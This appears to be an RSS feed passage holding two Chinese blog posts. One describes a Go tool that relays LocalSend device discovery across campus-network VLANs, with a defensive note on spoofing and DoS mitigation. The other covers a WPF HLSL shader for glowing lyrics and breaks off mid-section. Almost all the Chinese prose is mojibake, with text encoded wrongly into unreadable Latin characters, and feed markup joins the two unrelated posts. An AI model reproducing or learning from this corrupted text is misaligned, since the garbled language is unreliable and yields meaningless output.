<p><img src="https://serv.xbottle.top/i/https://raw.githubusercontent.com/cat-note/bottleassets/main/img/BDE19D9F629D18E59D1752BDB5FDBFDE-2026-01-17.jpg" alt="Analyzing" loading="lazy"></p>
<p>åæäºä¸ä¸åç°ï¼</p>
<ol>
<li>
<p>æ²¡æåæ³äºç¸åç°æ¯å ä¸ºï¼æçç¬è®°æ¬æ¥å¥çæ¯æ ¡å­ç½æ çº¿ç½ç»ï¼èæå°æºè®¡ç®æºæ¥å¥çæ¯æçº¿ç½ç»ï¼ä¸¤ä¸ªä¸»æºå¨<strong>ä¸åçå­ç½æ®µ</strong>åï¼è¿é»éäº LocalSend ååºçç»æ­å (å¯ä»¥åè <a href="https://github.com/localsend/protocol" target="_blank" rel="noopener nofollow">LocalSend åè®®</a>)ã</p>
</li>
<li>
<p>å¯ä»¥æå¨è¾å¥ IP å°åæ¥æå®å®¢æ·ç«¯ä¼ è¾æä»¶ï¼æ¯å ä¸º LocalSend å®éçä¼ è¾ç­è¯·æ±æ¯<strong>åæ­</strong>çï¼èæ ¡å­ç½å¨ä¸å±è®¾å¤ä¸æéç½®è·¯ç±è½¬åï¼æä»¥åæ­åæ¯å¯ä»¥äºéçã</p>
</li>
</ol>
<p>äºæ¯å±è¦è§£å³çé®é¢å°±æ¯ï¼å¦ä½å¨è¿ç§<strong>å¤æ­ (ç»æ­) éç¦»ä½æ¯åæ­äºé</strong>çä¸åå±åå­ç½é´å®ç° LocalSend çåç°åè½ã</p>
<h2 id="1-é®é¢æè¿°">1. é®é¢æè¿°</h2>
<p><img src="https://serv.xbottle.top/i/https://raw.githubusercontent.com/SomeBottle/localsend-switch/refs/heads/main/pics/issue_illustration.drawio.png" alt="Issue Illustration" loading="lazy"></p>
<blockquote>
<p>Figure 1: é®é¢ç¤ºæå¾ã å¯ä»¥çå° VLAN 0 ä¸­ç LocalSend å®¢æ·ç«¯æ æ³æååç° VLAN 2 ä¸­ç LocalSend å®¢æ·ç«¯ï¼åä¹äº¦ç¶ã</p>
</blockquote>
<p>LocalSend å®¢æ·ç«¯éç¨ UDP ç»æ­æ¥æèªå·±çå­å¨éåç»å±åç½ä¸­å¶ä»å®¢æ·ç«¯ãç¶èï¼åæ ¡å­ç½è¿ç§å¤§åå±åç½ï¼éå¸¸ä¸ºäºç®¡çååå°å¹¿æ­åè§æ¨¡ç­ç®çï¼ä¼å°ç½ç»ååä¸ºå¤ä¸ª VLANï¼èæå±åç½ï¼ï¼å¯¹åºå¤ä¸ªå­ç½ï¼å³ä½¿æ¯ç°å®ä¸­è·ç¦»å¾è¿çä¸¤ä¸ªè®¾å¤ï¼ä¹æå¯è½å¨ä¸åç VLAN ä¸­ã</p>
<ul>
<li>æ¯å¦æè¿æ¥å°æ ¡å­ç½ WiFi çç¬è®°æ¬çµèåè¿æ¥æçº¿æ ¡å­ç½çå®éªå®¤æå°æºçµèï¼è½ç¶å¨åä¸é´å±å­ï¼ä½å°±æ¯å¤äºä¸åç½æ®µçç½ç»ä¸­ã</li>
</ul>
<p>ä¸åå­ç½ä¹é´çæ°æ®è½¬åä¾èµäºç¬¬ä¸å±è·¯ç±è®¾å¤æ¥å®ç°ï¼ä¸å¹¸çæ¯ï¼LocalSend å <code>224.0.0.x</code> ç»æ­å°åååºç¨ç«¯å£åéç UDP æ¥ææ®µæ¯ä¸ä¼è¢«ä¸å±è®¾å¤è½¬åçï¼èä¸å¶ TTL å¼ä¸º <code>1</code>ï¼Wireshark æåå¦ä¸ï¼</p>
<p><img src="https://serv.xbottle.top/i/https://raw.githubusercontent.com/SomeBottle/localsend-switch/refs/heads/main/pics/wireshark_captured.png" alt="Wireshark Capture" loading="lazy"></p>
<blockquote>
<p>Figure 2: Wireshark æåæ¾ç¤º LocalSend åéçç»æ­ UDP æ¥ææ®µç TTL å¼ä¸º 1ã</p>
</blockquote>
<p>å æ­¤å°±æäºææä¸¤å°è®¾å¤è¿å¨å«å°ºï¼ä½æ¯å´æ²¡æ³äºç¸åç°å¯¹æ¹ LocalSend å®¢æ·ç«¯çå°´å°¬å±é¢ ã( â, â )ãã</p>
<h2 id="2-è§£å³é®é¢">2. è§£å³é®é¢</h2>
<h3 id="20-æè·¯">2.0. æè·¯</h3>
<p>å°½ç®¡å¤æ­è¢«éç¦»äºï¼ä½æ¯åå¬åºæ ¡å­ç½å¨ä¸å±éç½®ä¸æ¯ä¼è½¬ååæ­åçï¼æå¯ä»¥éè¿åæ­åä¸åç VLAN ä¸­çä¸»æºè¿è¡éä¿¡ã</p>
<p>ä¸ä¸ª LocalSend å®¢æ·ç«¯å¨å°è¯åç°å±åç½åå¶ä»å®¢æ·ç«¯æ¶ï¼ä¼åéç»æ­ UDP åæ¥å£°æèªå·±çå­å¨ï¼å¶ä»å®¢æ·ç«¯æ¶å°ç»æ­ååä¼éè¿<strong>åæ­ç HTTP è¯·æ±</strong>æ¥å¨è¿ä¸ªå®¢æ·ç«¯ä¸è¿è¡æ³¨åãå ä¸ºåæ­å¯ä»¥è·¨ VLANï¼æä»¥è¿ä¸ªæ³¨åæä½æ¯å¯ä»¥å®ç°çï¼æå¯ä»¥<strong>æ¿ LocalSend å®¢æ·ç«¯åå±åç½åçå¶ä» LocalSend å®¢æ·ç«¯åéæ³¨åè¯·æ±</strong>ï¼ä»èå®ç°è·¨ VLAN çåç°åæ³¨åã</p>
<p>ä»å®æ¹çåè®®ææ¡£å¯ä»¥çå° LocalSend çéåååæ³¨åè¯·æ±çè´è½½ä¸­é½åªæç«¯å£ä¿¡æ¯ï¼æ²¡ææº IP ä¿¡æ¯ï¼<strong>å®¢æ·ç«¯å¨å¤çå°æ¥çè¯·æ±æ¶å®éä¸æ¯ä»ç½ç»å±åç»å¤´é¨è·åå°æº IP å°å</strong>çï¼å æ­¤è¿ä¸ªè¯·æ±å¿é¡»ä» LocalSend å®¢æ·ç«¯æå¤çä¸»æºä¸ååºãä¸ºäºå®ç°è¿ç¹ï¼æå¯ä»¥<strong>å¨æ¯å°æ LocalSend çä¸»æºä¸é½é¢å¤è¿è¡ä¸ä¸ªå·¥å·è¿ç¨æ¥ä»£åæ³¨åè¯·æ±</strong>ã</p>
<p>å³é®çé®é¢æ¥äºï¼è¿äºå·¥å·è¿ç¨æä¹ç¥éå±åç½åå¶ä» LocalSend å®¢æ·ç«¯çå­å¨å¢ï¼å¶å®æå¯ä»¥åå©åæ­ä¼ è¾æ¥å®ç°è¿äºå·¥å·è¿ç¨ä¹é´çéä¿¡ï¼ä»èè®©å®ä»¬<strong>äºç¸äº¤æ¢</strong>åèªäºè§£ç LocalSend å®¢æ·ç«¯ä¿¡æ¯ã</p>
<p>ä¸ºäºè§£å³å¨æ IP çé®é¢ï¼æå¯ä»¥æå¶ä¸­ä¸ä¸ªæå¤ä¸ªå·¥å·è¿ç¨ä½ä¸ºäº¤æ¢èç¹<strong>é¨ç½²å¨æ¥æéæ IP çæå¡å¨</strong>ä¸ï¼åç½åå¤ç½çåå¯ï¼ï¼ç¶åè®©å¶ä»å·¥å·è¿ç¨è¿æ¥å°è¿äºäº¤æ¢èç¹ï¼å½äº¤æ¢è¿ç¨æ¶ææ¶ï¼è¿äºå·¥å·è¿ç¨å°±è½äºç¸äºè§£å¯¹æ¹æå¤ä¸»æºä¸ç LocalSend å®¢æ·ç«¯ä¿¡æ¯äºï¼ä¹è®© LocalSend å®¢æ·ç«¯äºç¸ç¥æäºå¯¹æ¹çå­å¨ï¼ã</p>
<p>æ­£å¥½æè¿å­¦äº Go è¯­è¨ï¼ç§çä¸é¢è¿ä¸ªæè·¯å®ç°ä¸æ¥ï¼LocalSend Switch è¿ä¸ªå·¥å·å°±è¯çè¾£ï¼Ù©(&gt;à¯°&lt;)Ù</p>
<ul>
<li>ç®åæ¥è¯´ LocalSend Switch åå½çè§è²å°±æç¹ç±»ä¼¼äº BT ä¸è½½ä¸­ç Tracker æå¡å¨äºï¼ä½åæ¶ä¹ä¼å¸®å¿åéåæ­çæ³¨åè¯·æ±ï¼ç¨äºè¾å©<strong>ç»æ­éç¦»ãåæ­åè®¸</strong>çå±åç½å­ç½ä¹é´ç LocalSend å®¢æ·ç«¯äºç¸åç°ã</li>
</ul>
<h3 id="21-å·¥ä½åç">2.1. å·¥ä½åç</h3>
<p><img src="https://serv.xbottle.top/i/https://raw.githubusercontent.com/SomeBottle/localsend-switch/refs/heads/main/pics/switch_strategy_illustration.drawio.png" alt="Switch Strategy Illustration" loading="lazy"></p>
<blockquote>
<p>Figure 3: LocalSend Switch çå·¥ä½åçç¤ºæå¾ãå®çº¿è¡¨ç¤ºçæ¯åæ­åç»çä¼ æ­è·¯å¾ï¼èçº¿è¡¨ç¤ºçæ¯ TCP é»è¾è¿æ¥ï¼èçº¿ä¸çç®­å¤´å¯¹åºæ°æ®å¨é»è¾ä¸çä¼ æ­æ¹åãLocalSend å®¢æ·ç«¯å Switch è¿ç¨çæè¾¹æ è®°äºè¿æ¥ç«¯å£ï¼åªæ VLAN 1 ä¸­ç Switch è¿ç¨çå¬äºæå¡ç«¯å£ <code>7761</code>ï¼å¶ä½ä¸¤ä¸ª Switch è¿ç¨çåä¸º OS åéçä¸´æ¶ç«¯å£ï¼LocalSend å®¢æ·ç«¯é»è®¤æå¡ç«¯å£æ¯ <code>53317</code>ã</p>
</blockquote>
<p>Fig.3 ä¸º LocalSend Switch çå·¥ä½åçç¤ºæå¾ï¼å±ç¤ºäºåæ¬¡çå®¢æ·ç«¯ä¿¡æ¯ä¼ æ­ä»¥åæ³¨åè¯·æ±ä»£åçè¿ç¨ãå¾ä¸­ï¼é¦å <code>10.84.0.0/15</code> ç½æ®µä¸­ <code>10.84.123.223</code> è¿å°ä¸»æºä¸ç LocalSend å®¢æ·ç«¯åéäºç»æ­åï¼éåèªå·±çå­å¨ï¼è¢«åä¸å°æºå¨ä¸ç LocalSend Switch æè·å°ï¼Switch è¿ç¨éåå°è¯¥éåä¿¡æ¯éè¿åæ­åé (å¾ä¸­æ è®°ä¸º <code>CLIENT ANNOUNCE</code>ï¼ä¼ æ­è·¯å¾ä¸ºèè²) ç»å®æè¿æ¥çææ Switch èç¹ (å¾ä¸­åªæ <code>192.168.232.47:7761</code> è¿ä¸ä¸ª)ã</p>
<ul>
<li>åéçæ°æ®ä¸­å°è£äº LocalSend <strong>å®¢æ·ç«¯ç IP åç«¯å£</strong>ï¼æ è®ºè¢«è½¬åå¤å°æ¬¡ï¼è¿é¨åæ°æ®é½ä¸ä¼åï¼æå<strong>æåååº</strong>è¿æ¡éåä¿¡æ¯ç LocalSend å®¢æ·ç«¯ã</li>
</ul>
<p><code>47</code> ä¸»æºä¸ Switch èç¹æ¥æ¶å°éåçå®¢æ·ç«¯ä¿¡æ¯åï¼ä¼å°è¯¥ä¿¡æ¯è½¬åè³å®æè¿æ¥ç<strong>å¶ä»</strong> Switch èç¹ï¼å¾ä¸­åªæ <code>10.94.23.114:52341</code>ï¼ï¼å¾ä¸­æ è®°ä¸º <code>FORWARD ANNOUNCE</code>ï¼ä¼ æ­è·¯å¾ä¸ºç´«è²ãå ä¸ºè¿å°ä¸»æºä¸æ²¡æ LocalSend å®¢æ·ç«¯ï¼æä»¥ä¸ä¼ææ³¨åè¯·æ±çä»£åæä½ã</p>
<p><code>114</code> ä¸»æºä¸ç Switch èç¹æ¥æ¶å°éåä¿¡æ¯åï¼ä¼å°è¯¥ä¿¡æ¯åéç»å®æè¿æ¥çå¶ä»ææ Switch èç¹ï¼å¾ä¸­æ²¡æå¶ä»èç¹äºï¼ï¼å ä¸ºè¿å°ä¸»æºä¸æ LocalSend å®¢æ·ç«¯ï¼æä»¥ Switch èç¹éåä¼åéåä¿¡æ¯ä¸­æºå¸¦ç LocalSend å®¢æ·ç«¯å°å (å¾ä¸­ä¸º <code>10.84.123.223:53317</code> ) åé HTTP(S) æ³¨åè¯·æ±ï¼å¾ä¸­æ è®°ä¸º <code>REGISTER CLIENT</code>ï¼ä¼ æ­è·¯å¾ä¸ºæ£è²ï¼ï¼åç¥å¯¹æ¹æ¬å°å®¢æ·ç«¯ç IP åå°å (å¾ä¸­ä¸º <code>10.94.23.114:53317</code>)ï¼å®ææ³¨åè¯·æ±çä»£åæä½ãæ³¨æè¿ä¸ªæ³¨åè¯·æ±æ¯ç´æ¥ç± Switch åéç» LocalSend å®¢æ·ç«¯çã</p>
<p>å®éä¸æ¯ä¸ª Switch èç¹é½æè¿æ ·çè½¬ååè½ï¼çè³å¯ä»¥å¨é»è¾ä¸ä¸²èæèç»ææ å½¢ãæåãç½ç¶ãæ··åç­ææç»æã</p>
<h2 id="3-æ´è¿ä¸æ­¥">3. æ´è¿ä¸æ­¥</h2>
<p>è§£å³äº LocalSend äºç¸åç°çé®é¢åï¼æåèèå¹¶è§£å³äºä»¥ä¸å ä¸ªé®é¢ï¼</p>
<ol>
<li>ä¼ è¾å®å¨æ§é®é¢ã</li>
<li>äº¤æ¢ä¿¡æ¯çç¯è·¯é®é¢ã</li>
<li>èªå¯å¨é®é¢ã</li>
</ol>
<blockquote>
<p>æ³¨ï¼è¿èç "Switch" åæ LocalSend Switch å·¥å·ã</p>
</blockquote>
<h3 id="30-ä¼ è¾å®å¨æ§é®é¢">3.0. ä¼ è¾å®å¨æ§é®é¢</h3>
<p>Switch èç¹é´çæ°æ®ä¼ è¾å¨ TCP è¿æ¥ä¸è¿è¡ï¼é»è®¤æåµä¸æ¯<strong>ææ</strong>çï¼å¶ä¸­ä¸»è¦æ¯ LocalSend å®¢æ·ç«¯çä¸»æºçå°åãè®¾å¤åå·ç­ä¿¡æ¯ã</p>
<p>å°½ç®¡å¨æ ¡å­ç½è¿ç§è¾ä¸ºå¯ä¿¡çå±åç½ä¸­ä¸ç¨æå¿é­å°ä¸­é´äººæ»å»ï¼èä¸ä¼ è¾çæ°æ®æ¬èº«ä¹æ²¡æé£ä¹ææï¼ä½å¦æä¸­é´æç Switch èç¹å¨å¤ç½ä¸ï¼å°±è¿æ¯æä¸å®é£é©çï¼å¦ä¸­é´äººå¯ä»¥ä¼ªé  LocalSend å®¢æ·ç«¯ä¿¡æ¯ï¼è¯±å¯¼å¶ä» Switch èç¹åæ¶ææé çåç½å®¢æ·ç«¯å°ååéæ³¨åè¯·æ±ï¼ä»èé ææç»æå¡æ»å» (DoS)ã</p>
<p>ä¸ºæ­¤å±èèè¿ <strong>TLS</strong> å å¯ä¼ è¾ï¼ä½æ¯èèå°éç½®åè¯ä¹¦ç®¡ççå¤ææ§ï¼æç»éæ©äº<strong>é¢å±äº«å¯é¥</strong> (PSK) æ¹å¼æ¥å¯¹ä¼ è¾çæ°æ®è¿è¡ç®åçå¯¹ç§°å å¯ï¼å³ææç¸åå¯é¥ç Switch èç¹æè½äºç¸éä¿¡ï¼ä¼ è¾çæ¯å¯æã</p>
<ul>
<li>
<p>å¦å¤ä¸ºäºé²æ­¢æ¥æ¶å°æ¶ææé ç LocalSend å®¢æ·ç«¯ä¿¡æ¯ï¼éå¶æ¯ä¸ª Switch èç¹<strong>ä»å¯åç§æ IP å°ååé</strong> HTTP(S) æ³¨åè¯·æ±ï¼é¿åä¸»æºè¢«å©ç¨åå¬ç½å°ååéè¯·æ±ã</p>
</li>
<li>
<p>è¿ä¸ªå·¥å·çä½¿ç¨åºæ¯å®éä¸æºç®åçï¼å æ­¤è¿ä¸ªç¨åº¦çå®å¨æ§åºè¯¥å·²ç»è¶³å¤äº (*ï¿£ï¼ï¿£)ãã</p>
</li>
</ul>
<h3 id="31-äº¤æ¢ä¿¡æ¯çç¯è·¯é®é¢">3.1. äº¤æ¢ä¿¡æ¯çç¯è·¯é®é¢</h3>
<p>æ¬ç§å­¦è®¡ç®æºç½ç»æ¶ï¼å¨ç½ç»å±è¿ä¸åå°±å¬èå¸è®²è¿ç¯è·¯é®é¢ãèæ¬å·¥å·å¦æä¸å ä»¥éå¶ä¹ä¼å¯¼è´åä¸æ¡ LocalSend å®¢æ·ç«¯ä¿¡æ¯è¢«ç¯çéå¤è½¬åï¼æµªè´¹å¸¦å®½åè®¡ç®èµæºã</p>
<p>ä¸ºäºè§£å³è¿ç¹å±éç¨äºä¸¤ä¸ªæªæ½ï¼</p>
<ol>
<li>
<p><strong>ç»å¸ç TTL æºå¶</strong>ãç»æ¯æ¡æ¶æ¯é½è®¾ç½®ä¸ä¸ª TTL å­æ®µï¼æ¯ç»è¿ä¸ä¸ª Switch èç¹ TTL åå <code>1</code>ï¼å½å¶åå° <code>0</code> æ¶è¯¥æ¶æ¯å°±ä¸åè¢«è½¬åã</p>
</li>
<li>
<p><strong>å¯ä¸ ID ç¼å­æºå¶</strong>ãæ¯æ¡ä¿¡æ¯é½æä¸ä¸ªå¯ä¸ IDï¼ç± Switch èç¹ç<em>ä¸´æ¶éæºæ è¯</em>ä»¥å<em>æ¶æ¯çéå¢ç¼å·</em>ç»æãæ¯ä¸ª Switch èç¹é½ä¼é¿åéå¤æç¸å ID çå®¢æ·ç«¯ä¿¡æ¯éå¤å å¥è½¬åç¼å²åºï¼ä¹å°±ä¸ä¼éå¤è½¬åå·²ç»è½¬åè¿ç LocalSend å®¢æ·ç«¯ä¿¡æ¯ã</p>
<ul>
<li>è¿ä¸ªå¯ä¸ ID ç¼å­æ¯æè¿ææ¶é´çï¼å±é»è®¤è®¾ç½®ä¸ºäº <code>5</code> åéï¼ä»¥é²æ­¢åå­æ éå¢é¿ã</li>
<li><em>ä¸´æ¶éæºæ è¯</em>æ¯å¨ Switch å¯å¨æ¶çæçï¼éå¯åä¼æ¹åï¼å æ­¤éå¯åç Switch èç¹ä¼è¢«è®¤ä¸ºæ¯ä¸ä¸ªæ°çèç¹ã</li>
<li><strong>å¯ä¸ ID æºå¶</strong>è¿è½ä¸å®ç¨åº¦ä¸é²æ­¢éæ¾æ»å»ã</li>
</ul>
</li>
</ol>
<h3 id="32-èªå¯å¨é®é¢">3.2. èªå¯å¨é®é¢</h3>
<p>å¦ææ¯æ¬¡ä½¿ç¨ LocalSend Switch é½éè¦æå¨å¯å¨çè¯ï¼å¤å°è¿æ¯æäºéº»ç¦ï¼å æ­¤å±ç¹å°è¿åäºå¼æº (ç»å½å) èªå¯çç¸å³éç½®æ¨¡åï¼ç®åæ¯æäº Windows å Linux (å¸¦æ¡é¢)ã</p>
<ul>
<li>Windows ä¸æ¯åèäº LocalSend çèªå¯å¨å®ç°ï¼å¾æ³¨åè¡¨éåå¥äºå¼æºèªå¯é¡¹ã</li>
<li>Linux ä¸åæ¯ä¾ç§ FreeDesktop ç <a href="https://specifications.freedesktop.org/desktop-entry/latest/recognized-keys.html" target="_blank" rel="noopener nofollow">Desktop Entry</a> è§èï¼åå¥äº <code>~/.config/autostart/</code> ç®å½ä¸ã</li>
<li>MacOS...å³å³ï¼å±è¿æ²¡è¹æçµèå¢ï¼ææ¶æ²¡æ³æµè¯åå®ç° Or2...</li>
</ul>
<h2 id="4-é¡¹ç®å°å--æ»ç»">4. é¡¹ç®å°å &amp; æ»ç»</h2>
<p>â¨ é¡¹ç®å°å: <a href="https://github.com/SomeBottle/localsend-switch" target="_blank" rel="noopener nofollow">https://github.com/SomeBottle/localsend-switch</a></p>
<p>ä¸é¡¿æè¾ä¸æ¥ï¼å±åè±äºå¥½å¤æ¶é´åäºè¿æ ·ä¸ä¸ªä½¿ç¨åºæ¯å¶å®æºå°ä¼çå·¥å·...ä¸è¿æ»çæ¥è¯´è¿æ¯æºæè¶£çï¼ä¸æ¹é¢çæäº Go è¯­è¨ç¨åºçåºæ¬ææ³åç¼åè§èï¼å¦ä¸æ¹é¢ä¹å¤ä¹ å¤ä¹ äºä¸ä¸è®¡ç®æºç½ç»ååºæ¬çç½ç»ç¼ç¨ç¥è¯ï¼åæ¯æå¨å»æ­ä¸ª TCP æå¡ï¼å®ç°ç®åçè¿æ¥ç»´æ¤ç­ç­ï¼ã</p>
<ul>
<li>å¤ä¹ å½å¤ä¹ ï¼ä¸ªäººå­¦èºä¸ç²¾ï¼é¾åæçæ¼ä¹å¤ï¼è¯·åä½å¤ææï¼</li>
</ul>
<p>å¨æå»è§£å³äºå®éé®é¢ï¼æ»å½æ¯ä¸ªä¸éçå­¦ä¹ éå¾å¢ (à¹â¢Ìãâ¢Ì)Ùâ§</p>
<p>è½¬ç¼ä¹ 2026 äºï¼ç¥åä½æ°å¹´å¿«ä¹ï¼äºä¸é¡ºå©ï¼å±ä»¬ä¸ä¸ç¯æç« åä¼~ (ã¥ï¿£ Â³ï¿£)ã¥</p>
<p><img src="https://serv.xbottle.top/i/https://raw.githubusercontent.com/cat-note/bottleassets/main/img/drink_coffee-2026-01-17.gif" alt="drink_coffee-2026-01-17" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.050694444444444445" data-date-updated="2026-01-18 00:18">2026-01-17 23:05</span>&nbsp;
<a href="https://www.cnblogs.com/somebottle">SomeBottle</a>&nbsp;
éè¯»(<span id="post_view_count">12</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19497343);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19497343', targetLink: 'https://www.cnblogs.com/somebottle/p/19497343/simple_report_of_localsend_switch', title: 'ãå°è®°ãè§£å³æ ¡å­ç½ä¸­åæ­äºéçä¸åå­ç½é´ç LocalSend åç°é®é¢' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ WPF ä½¿ç¨ HLSL + Clip å®ç°é«äº®æ­è¯åç§ææ ]]></title>
    <link>https://www.cnblogs.com/TwilightLemon/p/19497125</link>
    <guid>6e0a7dd6efb8e97561a0c6914fd22852</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/TwilightLemon/p/19497125" title="åå¸äº 2026-01-17 20:55">
    <span role="heading" aria-level="2">WPF ä½¿ç¨ HLSL + Clip å®ç°é«äº®æ­è¯åç§ææ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p>æè¿å¨æä¸ä¸ªLyricify Liteç±»ä¼¼ç©ï¼åæ¬ä½¿ç¨æ¸åç»å·å®ç°æ­è¯é«äº®ï¼ä½æ¯åç°è§è§ææä¸Apple Musicç¸å»çè¿ï¼åçº¯ä½¿ç¨ç½è²æ¸åç»å·ç¼ºä¹âé«äº®âçåç§æè§ï¼èApple Musicçæ­è¯é«äº®åæ´åæ¯æåçº¿æå°å¨æ­è¯ä¸ï¼å½¢æä¸ç§æåçååææã</p>
<p>åå°åæ¯å¤§ä½¬çæç« <a href="https://blog.walterlv.com/post/create-a-realistic-sunshine-on-your-desktop-using-wpf.html" rel="noopener nofollow">ä½¿ç¨ WPF åä¸ä¸ªå¯ä»¥é¼çå°ç§äº®ä½ æ¡é¢çé«æ§è½é³å - walterlv</a>å¯åï¼éå°è¯ä½¿ç¨HLSLç¼åä¸ä¸ªç®åçææ¬é«äº®çè²å¨ãåæ¥çå®è£å¨<a href="https://github.com/TwilightLemon/LemonLite" rel="noopener nofollow">LemonLite</a>ä¸­çææï¼</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1188749/202601/1188749-20260117211723011-1943026558.png" class="lazyload"></p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1188749/202601/1188749-20260117211733480-456993496.png" class="lazyload"></p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1188749/202601/1188749-20260117211742655-1018276252.png" class="lazyload"></p>
<p>&nbsp;</p>
<p>æ´ä½ä¸é«äº®ææ¬ä¸èæ¯æ··è²èªç¶ï¼æ¸åè¿æ¸¡ç±WPFå¨ç»é©±å¨ï¼é«äº®é¨åå°±æäºåæã</p>
<p>ä»¥ä¸æ¯æ¬æçæå°å¯è¿è¡ç¤ºä¾ï¼<a href="https://github.com/TwilightLemon/TextHighlighterTest" rel="noopener nofollow">TwilightLemon/TextHighlighterTest: WPF æµåç¹æææ¬æ§ä»¶</a></p>
<h2 id="ä¸å®ç°æè·¯">ä¸ãå®ç°æè·¯</h2>
<p>ç®åè¯´ä¸ä¸è¸©è¿çå ä¸ªåï¼</p>
<ol>
<li>ç´æ¥ç»TextBlockçä¸Effectä¼å¯¼è´ææ¬åç´ åï¼åå¾æ¨¡ç³èä¸é¾ä»¥å¤çææ¬è¾¹ç</li>
<li>ä½¿ç¨VisualBrushï¼åé¨å¥ä¸ä¸ªRectangle with Effect, ç¶åç¨è¿ä¸ªVisualBrushä½ä¸ºTextBlockçForegroundï¼æ§è½æå·®</li>
<li>ç»Rectangle with Effectåä¸ä¸ªClipè£åªåºææ¬å½¢ç¶ï¼æ§è½å¯ä»¥ï¼ä½æ¯éè¦å¤å»TextBlockçæçé»è¾</li>
</ol>
<p>æç»ä½¿ç¨äºç¬¬ä¸ç§æ¹æ¡ï¼å¹¶å°å¶å°è£æä¸ä¸ªç¨æ·æ§ä»¶ã</p>
<p>å¦æ­¤ä¸æ¥ï¼HLSLçè²å¨è¦å¹²çäºæå°±å¾ç®åäºï¼åä¸ä¸ªé«äº®è¿æ¸¡ä½ç½®posï¼æ ¹æ®éæ ·åç´ çXåæ è®¡ç®åç§å¼ºåº¦ï¼ç¶åå°è¿ä¸ªå¼ºåº¦ä¸ææ¬é¢è²åå æ³æ··åå³å¯ã</p>
<h2 id="äºhlslçè²å¨ä»£ç ">äºãHLSLçè²å¨ä»£ç </h2>
<p>ä¸ºäºééæ­è¯é«äº®éæ±ï¼æåè¿½å äºä¸äºç¹æ§ï¼</p>
<ol>
<li>æ¯æé«äº®é¢è²èªå®ä¹</li>
<li>æ¯æé«äº®å®½åº¦è°æ´</li>
<li>æ¯æåæ¢é«äº®æ¨¡å¼ï¼å æ³æ··å/çº¿æ§æ¸åï¼</li>
</ol>
<p>ä»¥ä¸æ¯å®æ´çHLSLä»£ç ï¼ ï¼åæ²¡æhlslé«äº®å¢? ï¼</p>
<div class="cnblogs_code">
<pre>sampler2D input : register(s0);

float HighlightPos : register(c0);
float HighlightWidth : register(c1);
float4 HighlightColor : register(c2);
float UseAdditive : register(c3); // 0 = lerp, 1 = additive
float HighlightIntensity : register(c4);

float4 main(float2 uv : TEXCOORD) : COLOR
{
    float4 color = tex2D(input, uv);
    float d = max(0, uv.x - HighlightPos);
    float glow = saturate(1 - d / HighlightWidth);
    glow = glow * glow;
    float intensity = glow * HighlightColor.a * HighlightIntensity;

    float3 lerpResult = lerp(color.rgb, HighlightColor.rgb, intensity);
    float lerpAlpha = lerp(color.a, 1.0, intensity);
    float3 additiveResult = color.rgb + HighlightColor.rgb * intensity;

    color.rgb = lerp(lerpResult, additiveResult, UseAdditive);
    color.a = lerp(lerpAlpha, color.a, UseAdditive);

    return color;
}</pre>
</div>
<h3 id="çè²å¨è¾å¥åæ°">çè²å¨è¾å¥åæ°</h3>
<table>
<thead>
<tr><th>åæ°</th><th>ä½ç¨</th></tr>
</thead>
<tbody>
<tr>
<td><code>input</code></td>
<td>è¾å¥çº¹çï¼ææ¬åç´ ï¼</td>
</tr>
<tr>
<td><code>HighlightPos</code></td>
<td>é«äº®è¿æ¸¡ä½ç½®ï¼0-1ï¼ä»å·¦å°å³, å½ç¶ä¹å¯ä»¥åè´æ°ï¼</td>
</tr>
<tr>
<td><code>HighlightWidth</code></td>
<td>é«äº®è¡°åå®½åº¦ï¼0-1ï¼</td>
</tr>
<tr>
<td><code>HighlightColor</code></td>
<td>é«äº®é¢è²ï¼å«éæåº¦ï¼</td>
</tr>
<tr>
<td><code>UseAdditive</code></td>
<td>æ··åæ¨¡å¼å¼å³ï¼0=çº¿æ§æ¸åï¼1=å æ³æ··åï¼</td>
</tr>
<tr>
<td><code>HighlightIntensity</code></td>
<td>é«äº®å¼ºåº¦åæ°</td>
</tr>
</tbody>
</table>
<h3 id="è®¡ç®è¿ç¨">è®¡ç®è¿ç¨</h3>
<ol>
<li>éæ · â è¯»åå½ååç´ é¢è²<br>color = tex2D(input, uv)</li>
<li>è®¡ç®è·ç¦» â åç´ Xåæ ä¸é«äº®ä½ç½®çè·ç¦»<br>d = max(0, uv.x - HighlightPos)</li>
<li>è®¡ç®åæå¼ºåº¦ â æ ¹æ®è·ç¦»çæå¹³æ»è¡°å<br>glow = saturate(1 - d / HighlightWidth)<br>glow = glow * glow // å¹³æ¹å¤çï¼ä½¿è¡°åæ´é¡å³­</li>
<li>æç»å¼ºåº¦ = åæ Ã é¢è²éæåº¦ Ã å¼ºåº¦åæ°</li>
<li>æ··åå¤ç â æ ¹æ®UseAdditiveéæ©æ··åæ¹å¼
<ul>
<li>çº¿æ§æ¸åï¼å¨åè²åé«äº®è²é´æå¼</li>
<li>å æ³æ··åï¼ç´æ¥å å é«äº®è²</li>


</ul>


</li>


</ol>
<h4 id="å½æ°è¯´æ">å½æ°è¯´æ</h4>
<ul>
<li><code>saturate(x)</code>&nbsp;- å°å¼é³å¶å¨ [0, 1] èå´å</li>
<li><code>step(edge, x)</code>&nbsp;- å¦æ x &lt; edge è¿å 0ï¼å¦åè¿å 1</li>
<li><code>lerp(a, b, t)</code>&nbsp;- çº¿æ§æå¼ï¼è®¡ç® a + (b-a)Ãt</li>
<li><code>tex2D(sampler, uv)</code>&nbsp;- ä»çº¹çéæ ·æå®åæ çåç´ </li>


</ul>
<h3 id="ç¼è¯å¹¶å è½½çè²å¨">ç¼è¯å¹¶å è½½çè²å¨</h3>
